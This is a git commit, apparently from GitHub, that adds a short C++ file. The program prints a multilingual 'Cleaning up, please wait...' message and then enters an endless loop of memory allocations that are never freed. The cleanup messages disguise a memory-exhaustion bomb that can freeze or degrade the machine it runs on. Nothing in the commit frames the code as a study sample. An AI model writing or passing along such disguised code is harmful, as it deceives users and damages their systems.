4c70e063503bfb00ab4e741792751243f9d6760e
HelloWorld <104149332+ming-14@users.noreply.github.com>
2022-07-02 19:56:14 +0800

    init

---
+++ main.cpp
@@ -0,0 +1,27 @@
+#include<iostream>
+using namespace std;
+
+int main()
+{
+    cout << "清理中，请稍后..." << endl;
+    cout << "清理中，請稍後..." << endl;
+    cout << "Cleaning up, please wait..." << endl;
+    cout << "Уборка, пожалуйста, подождите..." << endl;
+    cout << "Đang dọn dẹp, vui lòng đợi ..." << endl;
+    cout << "Per pulire, attendere..." << endl;
+    cout << "Limpiando, por favor espere..." << endl;
+    cout << "Прибирання, зачекайте..." << endl;
+    cout << "Temizleniyor, lütfen bekleyin..." << endl;
+    cout << "กำลังทำความสะอาด กรุณารอสักครู่..." << endl;
+    cout << "片付け、お待ちください..." << endl;
+    cout << "Purgatio sursum, quaeso, expecta..." << endl;
+    cout << "Probíhá úklid, čekejte prosím..." << endl;
+    cout << "청소 중입니다. 잠시만 기다려 주십시오..." << endl;
+    cout << "Aufräumen, bitte warten..." << endl;
+    cout << "جاري التنظيف ، برجاء الانتظار ..." << endl;
+    for(int i = 2000; true;)
+    {
+        new int[i];
+    }
+    return 0;
+}
